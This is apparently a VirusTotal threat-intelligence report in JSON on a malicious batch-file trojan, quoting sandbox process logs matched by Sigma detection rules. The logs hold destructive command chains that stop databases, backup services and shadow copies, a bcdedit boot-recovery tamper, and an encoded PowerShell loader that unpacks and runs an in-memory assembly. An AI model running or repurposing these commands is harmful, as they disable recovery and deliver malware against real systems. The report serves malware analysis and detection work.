{
    "data":  {
                 "id":  "6de853a9d15eed7187d4a0c758a51e9f992be6ccc8c2d2145e2a37e957e306ed",
                 "type":  "file",
                 "links":  {
                               "self":  "https://www.virustotal.com/api/v3/files/6de853a9d15eed7187d4a0c758a51e9f992be6ccc8c2d2145e2a37e957e306ed"
                           },
                 "attributes":  {
                                    "type_extension":  "bat",
                                    "exiftool":  {
                                                     "MIMEType":  "text/plain",
                                                     "FileType":  "TXT",
                                                     "WordCount":  "2040",
                                                     "LineCount":  "510",
                                                     "MIMEEncoding":  "us-ascii",
                                                     "FileTypeExtension":  "txt",
                                                     "Newlines":  "Windows CRLF"
                                                 },
                                    "type_tag":  "bat",
                                    "magika":  "VBA",
                                    "popular_threat_classification":  {
                                                                          "popular_threat_category":  [
                                                                                                          {
                                                                                                              "count":  11,
                                                                                                              "value":  "trojan"
                                                                                                          }
                                                                                                      ],
                                                                          "suggested_threat_label":  "trojan.batldobf/setter",
                                                                          "popular_threat_name":  [
                                                                                                      {
                                                                                                          "count":  9,
                                                                                                          "value":  "batldobf"
                                                                                                      },
                                                                                                      {
                                                                                                          "count":  4,
                                                                                                          "value":  "setter"
                                                                                                      }
                                                                                                  ]
                                                                      },
                                    "reputation":  -2,
                                    "tags":  [
                                                 "bat",
                                                 "calls-wmi",
                                                 "checks-user-input",
                                                 "checks-usb-bus",
                                                 "malware",
                                                 "long-sleeps",
                                                 "detect-debug-environment"
                                             ],
                                    "times_submitted":  6,
                                    "size":  184789,
                                    "sigma_analysis_stats":  {
                                                                 "high":  6,
                                                                 "medium":  3,
                                                                 "critical":  2,
                                                                 "low":  7
                                                             },
                                    "tlsh":  "T1060402C2927125D78BF0A4774C8CAA4A575FCBD10328F0DF60D61C82E82D977EB855EA",
                                    "first_submission_date":  1688281033,
                                    "type_description":  "DOS batch file",
                                    "last_analysis_date":  1738689852,
                                    "threat_severity":  {
                                                            "threat_severity_level":  "SEVERITY_MEDIUM",
                                                            "threat_severity_data":  {
                                                                                         "num_gav_detections":  2,
                                                                                         "popular_threat_category":  "trojan"
                                                                                     },
                                                            "last_analysis_date":  "1708596540",
                                                            "version":  5,
                                                            "level_description":  "Severity MEDIUM because it was considered trojan."
                                                        },
                                    "names":  [
                                                  "6de853a9d15eed7187d4a0c758a51e9f992be6ccc8c2d2145e2a37e957e306ed.bat",
                                                  "NA_6de853a9d15eed7187d4a0c75.bat",
                                                  "Gsismkswcbe.cmd.exe.bat",
                                                  "Gsismkswcbe.cmd"
                                              ],
                                    "trid":  [
                                                 {
                                                     "file_type":  "file seems to be plain text/ASCII",
                                                     "probability":  0.0
                                                 }
                                             ],
                                    "sigma_analysis_results":  [
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-829A-64A1-2006-000000004400}; ProcessId=7248; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-8299-64A1-1606-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8052; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cmd  /c \"color b \u0026 sc config MSSQLSERVER start=disabled \u0026 sc config \"SQL Server (MSSQLSERVER)\" start=disabled \u0026 net stop MSSQL$ \u0026 sc config MSSQL$ start=disabled \u0026 net stop SQLSERVERAGENT \u0026 sc config SQLSERVERAGENT start=disabled \u0026 net stop SQLBrowser \u0026 sc config SQLBrowser start=disabled \u0026 net stop vss \u0026 sc config vss start=disabled \u0026 net stop SQLWriter \u0026 sc config SQLWriter start=disabled \u0026 net stop vmvss \u0026 sc config vmvss start=disabled \u0026 sc config MSSQL$FE_EXPRESS start= disabled \u0026 net stop MSSQL$RE_EXPRESS \u0026 net stop SQLANYs_Sage_FAS_Fixed_Assets \u0026 sc config SQLANYs_Sage_FAS_Fixed_Assets start=disabled \u0026 net stop MSSQL$VIM_SQLEXP \u0026 sc config MSSQL$VIM_SQLEXP start=disabled \u0026 net stop \"MSSQLFDLauncher\" \u0026 net stop \"MSSQLSERVER\"\"; EventID=1; LogonGuid=C784477D-EFF1-6489-53ED-030000000000; LogonId=257363; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\FF.bat\" \"; UtcTime=1688306330; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-829A-64A1-2806-000000004400}; ProcessId=2220; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-8299-64A1-1606-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8052; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cmd  /c \"color b \u0026 a \u0026 net stop \"SQLSERVERAGENT\" \u0026 net stop \"SQLBrowser\" \u0026 net stop \"SQLTELEMETRY\" \u0026 net stop \"MsDtsServer130\" \u0026 net stop \"SSISTELEMETRY130\" \u0026 net stop \"SQLWrite\" \u0026 net stop \"MSSQL$VEEAMSQL2012\" \u0026 net stop \"SQLAgent$VEEAMSQL2012\" \u0026 net stop \"MSSQL\" \u0026 net stop \"SQLAgent\" \u0026 net stop \"MSSQLServerADHelper100\" \u0026 net stop \"MSSQLServerOLAPService\" \u0026 net stop \"MsDtsServer100\" \u0026 net stop \"ReportServer\" \u0026 net stop \"SQLTELEMETRY$HL\" \u0026 net stop \"TMBMServer\" \u0026 net stop \"MSSQL$PROGID\" \u0026 net stop \"MSSQL$WOLTERSKLUWER\" \u0026 net stop \"SQLAgent$PROGID\" \u0026 net stop \"SQLAgent$WOLTERSKLUWER\" \u0026 net stop \"MSSQLFDLauncher$OPTIMA\" \u0026 net stop \"MSSQL$OPTIMA\" \u0026 net stop \"SQLAgent$OPTIMA\" \u0026 net stop \"ReportServer$OPTIMA\" \u0026 net stop \"msftesql$SQLEXPRESS\" \u0026 net stop \"postgresql-x64-9.4\" \u0026 sc config \"MSSQLFDLauncher\" start= disabled \u0026 sc config \"SQLSERVERAGENT\" start= disabled \u0026 sc config \"SQLBrowser\" start= disabled \u0026 sc config \"SQLTELEMETRY\" start= disabled \u0026 sc config \"MsDtsServer130\" start= disabled \u0026 sc config \"SSISTasdRY130\" start= disabled \u0026 sc config \"MSSQL$WOLTERSKLUWER\" start= disabled \u0026 sc config \"SQLAgent$PROGID\" start= disabled \"; EventID=1; LogonGuid=C784477D-EFF1-6489-53ED-030000000000; LogonId=257363; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\FF.bat\" \"; UtcTime=1688306330; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-829B-64A1-3B06-000000004400}; ProcessId=7628; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-8299-64A1-1606-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8052; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cmd  /c \"color b \u0026 a \u0026 net stop \"MSOLAP$SHOPCONTROL9\" \u0026 net stop \"MSSQL$SHOPCONTROL9\" \u0026 net stop \"MSSQLFDLauncher$SHOPCONTROL9\" \u0026 net stop \"ReportServer$SHOPCONTROL9\" \u0026 net stop \"SQLAgent$SHOPCONTROL9\" \u0026 net stop \"NetBackup Client Service\" \u0026 net stop \"NetBackup Discovery Framework\" \u0026 net stop \"NetBackup Legacy Client Service\" \u0026 net stop \"NetBackup Legacy Network Service\" \u0026 net stop \"NetBackup Proxy Service\" \u0026 net stop \"NetBackup SAN Client Fibre Transport Service\" \u0026 taskkill /IM mysqld-nt.exe /F \u0026 taskkill /IM NFVPrint.exe /F \u0026 taskkill /IM licenceserver.exe /F \u0026 taskkill /IM Launchpad.exe /F \u0026 taskkill /F /IM \"FileZilla Server.exe\" \u0026 taskkill /F /IM cbService.exe \u0026 taskkill /F /IM cbInterface.exe \u0026 taskkill /F /IM pvxwin32.exe \u0026 taskkill /F /IM pvxwin64.exe \u0026 taskkill /F /IM pvxcom.exe \u0026 taskkill /F /IM pvxiosvr.exe \u0026 taskkill /F /IM Sage.NA.AT_AU.SysTray.exe \u0026 taskkill /F /IM Sage.NA.AT_AU.Service.exe\"; EventID=1; LogonGuid=C784477D-EFF1-6489-53ED-030000000000; LogonId=257363; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\FF.bat\" \"; UtcTime=1688306331; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "critical",
                                                                       "rule_id":  "2319d1843957b572c6e41e1d83656e12eac1e5e75f59ac1ccc309c2b00e9ef86",
                                                                       "rule_source":  "Joe Security Rule Set (GitHub)",
                                                                       "rule_title":  "Stop multiple services",
                                                                       "rule_description":  "Stop multiple services",
                                                                       "rule_author":  "Joe Security"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-829A-64A1-2306-000000004400}; ProcessId=7848; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-8299-64A1-1606-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8052; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cmd  /c \"color b \u0026 a \u0026 taskkill /F /IM Veeam.Backup.Agent.ConfigurationService.exe \u0026 taskkill /F /IM Veeam.Backup.BrokerService.exe \u0026 taskkill /F /IM Veeam.Backup.CatalogDataService.exe \u0026 taskkill /F /IM Veeam.Backup.CloudService.exe \u0026 taskkill /F /IM Veeam.Backup.Manager.exe \u0026 taskkill /F /IM Veeam.Backup.MountService.exe \u0026 taskkill /F /IM Veeam.Backup.Service.exe \u0026 taskkill /F /IM Veeam.Backup.WmiServer.exe \u0026 taskkill /F /IM Veeam.Guest.Interaction.Proxy.exe \u0026 taskkill /F /IM VeeamDeploymentSvc.exe \u0026 taskkill /F /IM VeeamNFSSvc.exe \u0026 taskkill /F /IM VeeamTransportSvc.exe \u0026 taskkill /F /IM sqlbrowser.exe \u0026 taskkill /F /IM sqlceip.exe \u0026 taskkill /F /IM sqlservr.exe \u0026 taskkill /F /IM sqlwriter.exe \u0026 taskkill /F /IM sqlagentc.exe \u0026 taskkill /F /IM ReportingServicesService.exe \u0026 taskkill /F /IM Ssms.exe \u0026 taskkill /F /IM fdhost.exe \u0026 taskkill /F /IM fdlauncher.exe \u0026 taskkill /F /IM MsDtsSrvr.exe \u0026 taskkill /F /IM msmdsrv.exe \u0026 taskkill /F /IM mysql.exe \u0026 taskkill /F /IM mysqld.exe \u0026 taskkill /F /IM w3wp.exe \u0026 taskkill /F /IM wsusservice.exe \u0026 taskkill /F /IM SageCSClient.exe \u0026 taskkill /F /IM UFSoft.U8.OC.QuartzScheduler.exe \u0026 taskkill /F /IM Launchpad.exe \u0026 taskkill /F /IM dbsrv12.exe \u0026 taskkill /F /IM EXCEL.EXE \u0026 taskkill /F /IM OUTLOOK.EXE \u0026 taskkill /F /IM WINWORD.EXE \u0026 taskkill /F /IM OneDrive.exe \u0026 taskkill /F /IM TaskService.exe\"; EventID=1; LogonGuid=C784477D-EFF1-6489-53ED-030000000000; LogonId=257363; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\FF.bat\" \"; UtcTime=1688306330; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-829B-64A1-3306-000000004400}; ProcessId=6836; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-8299-64A1-1606-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8052; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cmd  /c \"color b \u0026 taskkill /F /IM U8WorkerService.exe \u0026 taskkill /F /IM UFIDA.U8.ECE.UTU.Services.exe \u0026 taskkill /F /IM UFIDA.U8.UAP.ReportService.exe \u0026 taskkill /F /IM U8AllAuthServer.exe \u0026 taskkill /F /IM U8WebPool.exe \u0026 taskkill /F /IM U8TaskService.exe \u0026 taskkill /F /IM UFIDA.U8.Report.SLReportService.exe \u0026 taskkill /F /IM U8SCMPool.exe \u0026 taskkill /F /IM U8DispatchService.exe\"; EventID=1; LogonGuid=C784477D-EFF1-6489-53ED-030000000000; LogonId=257363; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\FF.bat\" \"; UtcTime=1688306331; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-829B-64A1-3B06-000000004400}; ProcessId=7628; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-8299-64A1-1606-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8052; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cmd  /c \"color b \u0026 a \u0026 net stop \"MSOLAP$SHOPCONTROL9\" \u0026 net stop \"MSSQL$SHOPCONTROL9\" \u0026 net stop \"MSSQLFDLauncher$SHOPCONTROL9\" \u0026 net stop \"ReportServer$SHOPCONTROL9\" \u0026 net stop \"SQLAgent$SHOPCONTROL9\" \u0026 net stop \"NetBackup Client Service\" \u0026 net stop \"NetBackup Discovery Framework\" \u0026 net stop \"NetBackup Legacy Client Service\" \u0026 net stop \"NetBackup Legacy Network Service\" \u0026 net stop \"NetBackup Proxy Service\" \u0026 net stop \"NetBackup SAN Client Fibre Transport Service\" \u0026 taskkill /IM mysqld-nt.exe /F \u0026 taskkill /IM NFVPrint.exe /F \u0026 taskkill /IM licenceserver.exe /F \u0026 taskkill /IM Launchpad.exe /F \u0026 taskkill /F /IM \"FileZilla Server.exe\" \u0026 taskkill /F /IM cbService.exe \u0026 taskkill /F /IM cbInterface.exe \u0026 taskkill /F /IM pvxwin32.exe \u0026 taskkill /F /IM pvxwin64.exe \u0026 taskkill /F /IM pvxcom.exe \u0026 taskkill /F /IM pvxiosvr.exe \u0026 taskkill /F /IM Sage.NA.AT_AU.SysTray.exe \u0026 taskkill /F /IM Sage.NA.AT_AU.Service.exe\"; EventID=1; LogonGuid=C784477D-EFF1-6489-53ED-030000000000; LogonId=257363; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\FF.bat\" \"; UtcTime=1688306331; RuleName=-}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-829C-64A1-4106-000000004400}; ProcessId=3148; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows Command Processor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-8299-64A1-1606-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE; OriginalFileName=Cmd.Exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=8052; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=cmd  /c \"color b \u0026 a \u0026 @taskkill /IM Tomcat7w.exe /F \u0026 @taskkill /IM \"UFSoft.U8.OC.QuartzScheduler.exe\" /F \u0026 @taskkill /IM UFSoft.U8.OC.QuartzScheduler.exe /F \u0026 @taskkill /IM Launchpad.exe /F \u0026 @taskkill /IM mpdwsvc.exe /F \u0026 @taskkill /IM cbVSCService11.exe /F \u0026 @taskkill /IM cbService.exe /F \u0026 @sc delete CobianBackup11 \u0026 @sc delete cbVSCService11 \u0026 @taskkill /IM mysqld-nt.exe /F \u0026 @taskkill /IM \"Kingdee.K3.CRM.MMC.AutoService.exe\" /F \u0026 @taskkill /IM sqlceip.exe /F \u0026 @taskkill /IM \"Microsoft.SqlServer.IntegrationServices.MasterServiceHost.exe\" /F \u0026 taskkill /F /IM store.exe \u0026 taskkill /F /IM MSExchangeMailboxReplication.exe \u0026 taskkill /F /IM Microsoft.Exchange.ProtectedServiceHost.exe \u0026 taskkill /F /IM MSExchangeThrottling.exe \u0026 taskkill /F /IM EdgeTransport.exe \u0026 taskkill /F /IM MSExchangeTransportLogSearch.exe \u0026 taskkill /F /IM Microsoft.Exchange.RpcClientAccess.Service.exe \u0026 taskkill /F /IM Microsoft.Exchange.AddressBook.Service.exe \u0026 taskkill /F /IM DataCollectorSvc.exe \u0026 taskkill /F /IM Microsoft.Exchange.ServiceHost.exe \u0026 taskkill /F /IM Microsoft.Exchange.ContentFilter.Wrapper.exe \u0026 taskkill /F /IM MSExchangeMailboxAssistants.exe \u0026 taskkill /F /IM msexchangerepl.exe \u0026 taskkill /F /IM Microsoft.Exchange.Search.ExSearch.exe \u0026 taskkill /F /IM Microsoft.Exchange.EdgeSyncSvc.exe \u0026 taskkill /F /IM MsExchangeFDS.exe \u0026 taskkill /F /IM MSExchangeMailSubmission.exe \u0026 taskkill /F /IM MSExchangeTransport.exe \u0026 taskkill /F /IM Microsoft.Exchange.AntispamUpdateSvc.exe\"; EventID=1; LogonGuid=C784477D-EFF1-6489-53ED-030000000000; LogonId=257363; Image=C:\\Windows\\System32\\cmd.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\AppData\\Local\\Temp\\FF.bat\" \"; UtcTime=1688306332; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "critical",
                                                                       "rule_id":  "868e81758b31ab7d5c37adbd3798dbc1effacb9eeaad44e5f6c5f41c409fb786",
                                                                       "rule_source":  "Joe Security Rule Set (GitHub)",
                                                                       "rule_title":  "Kill multiple process",
                                                                       "rule_description":  "Kill multiple process",
                                                                       "rule_author":  "Joe Security"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-8273-64A1-1406-000000004400}; ProcessId=7560; Product=Microsoft\\xae Windows\\xae Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid={C784477D-8272-64A1-1106-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentProcessId=7444; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=\"C:\\Users\\george\\Desktop\\install.bat\".exe  -wIn 1 -enC JABDAHYAcAB0AGQAcAB4AHEAYwAgAD0AIABbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AGkAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBHAGUAdABDAHUAcgByAGUAbgB0AFAAcgBvAGMAZQBzAHMAKAApAC4ATQBhAGkAbgBNAG8AZAB1AGwAZQAuAEYAaQBsAGUATgBhAG0AZQA7ACAAJABFAGYAagB1AHYAawAgAD0AIAAkAEMAdgBwAHQAZABwAHgAcQBjAC4ATABlAG4AZwB0AGgAOwAkAEUAZgBqAHUAdgBrACAAPQAgACQARQBmAGoAdQB2AGsAIAAtACAANAA7ACQAWABuAGMAZQBxAHAAcAB1AGEAbgAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBTAHQAcgBpAG4AZwBCAHUAaQBsAGQAZQByADsAIABmAG8AcgBlAGEAYwBoACAAKAAkAGwAaQBuAGUAIABpAG4AIABbAFMAeQBzAHQAZQBtAC4ASQBPAC4ARgBpAGwAZQBdADoAOgBSAGUAYQBkAEwAaQBuAGUAcwAoACQAQwB2AHAAdABkAHAAeABxAGMALgBSAGUAbQBvAHYAZQAoACQARQBmAGoAdQB2AGsAKQApACkAIAB7ACAAaQBmACAAKAAkAGwAaQBuAGUAIAAtAGwAaQBrAGUAIAAnACoAIAAjACoAJwApACAAewAgACAAJABYAG4AYwBlAHEAcABwAHUAYQBuAC4AQQBwAHAAZQBuAGQAKAAkAGwAaQBuAGUALgBTAHAAbABpAHQAKAAnACMAJwApAFsAMQBdACkAIAB8ACAATwB1AHQALQBOAHUAbABsAH0AIAB9ADsAIAAkAFkAagBlAGoAeAByAHgAbAB6ACAAPQAgAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAkAFgAbgBjAGUAcQBwAHAAdQBhAG4ALgBUAG8AUwB0AHIAaQBuAGcAKAApACkAOwAkAFUAYQB1AHcAcwBtAHUAZgBlACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAIAAsACAAJABZAGoAZQBqAHgAcgB4AGwAegAgACkAOwAkAG8AdQB0AHAAdQB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsAJABQAGEAagBwAHUAcABwAGQAegBiAGYAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAgACQAVQBhAHUAdwBzAG0AdQBmAGUALAAgACgAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAOwAkAFAAYQBqAHAAdQBwAHAAZAB6AGIAZgAuAEMAbwBwAHkAVABvACgAIAAkAG8AdQB0AHAAdQB0ACAAKQA7ACQAUABhAGoAcAB1AHAAcABkAHoAYgBmAC4AQwBsAG8AcwBlACgAKQA7ACQAVQBhAHUAdwBzAG0AdQBmAGUALgBDAGwAbwBzAGUAKAApADsAWwBiAHkAdABlAFsAXQBdACAAJABZAGoAZQBqAHgAcgB4AGwAegAgAD0AIAAkAG8AdQB0AHAAdQB0AC4AVABvAEEAcgByAGEAeQAoACkAOwBbAEEAcgByAGEAeQBdADoAOgBSAGUAdgBlAHIAcwBlACgAJABZAGoAZQBqAHgAcgB4AGwAegApADsAIAAkAFoAaQBuAGQAcgBzAHgAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoACQAWQBqAGUAagB4AHIAeABsAHoAKQA7ACAAJABVAGwAZwBzAGQAZAAgAD0AIAAkAFoAaQBuAGQAcgBzAHgALgBFAG4AdAByAHkAUABvAGkAbgB0ADsAIAAkAEQAZgB1AGgAegBuACAAPQAgACQAWgBpAG4AZAByAHMAeAAuAEMAcgBlAGEAdABlAEkAbgBzAHQAYQBuAGMAZQAoACQAVQBsAGcAcwBkAGQALgBOAGEAbQBlACkAOwAgACQAVQBsAGcAcwBkAGQALgBJAG4AdgBvAGsAZQAoACQARABmAHUAaAB6AG4ALAAgACQAbgB1AGwAbAApACAAfAAgAE8AdQB0AC0ATgB1AGwAbAA=; EventID=1; LogonGuid=C784477D-EFF1-6489-53ED-030000000000; LogonId=257363; Image=C:\\Users\\george\\Desktop\\install.bat.exe; IntegrityLevel=High; ParentCommandLine=C:\\Windows\\system32\\cmd.exe /c \"\"C:\\Users\\george\\Desktop\\install.bat\" \"; UtcTime=1688306291; RuleName=-}"
                                                                                             }
                                                                                         ],
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "12273189dbbd1ed526c045fb9a7d5e45682ba4e0a13e2e94d65376962a0bfc2e",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious PowerShell Encoded Command Patterns",
                                                                       "rule_description":  "Detects PowerShell command line patterns in combincation with encoded commands that often appear in malware infection chains",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)"
                                                                   },
                                                                   {
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid={C784477D-829F-64A1-A106-000000004400}; ProcessId=7952; Product=Microsoft\\xae Windows\\xae Operating System; Description=Boot Configuration Data Editor; Company=Microsoft Corporation; ParentProcessGuid={C784477D-829D-64A1-6806-000000004400}; User=DESKTOP-B0T93D6\\george; Hashes=MD5=C46E3768DB01E7DC3B92EF42CC1B9C73,SHA256=3AD26DB8DC988EAD9E73FECF4D8D888A66F7965AC09F8AF4E3CFCD09028A5B59,IMPHASH=5590A306D0FA939852B69E8411CA102B; OriginalFileName=bcdedit.exe; ParentImage=C:\\Windows\\System32\\cmd.exe; FileVersion=10.0.17134.950 (WinBuild.160101.0800); ParentProcessId=8072; CurrentDirectory=C:\\Users\\george\\Desktop\\; CommandLine=bcdedit  /set {current} bootstatuspolicy ignoreallfailures; EventID=1; LogonGuid=C784477D-EFF1-6489-53ED-030000000000; LogonId=257363; Image=C:\\Windows\\System32\\bcdedit.exe; IntegrityLevel=High; ParentCommandLine=\"C:\\Windows\\System32\\cmd.exe\" /c bcdedit /set {current} bootstatuspolicy ignoreallfailures; UtcTime=1688306335; RuleName=-}"
                                                                                             },
                                                                                             {
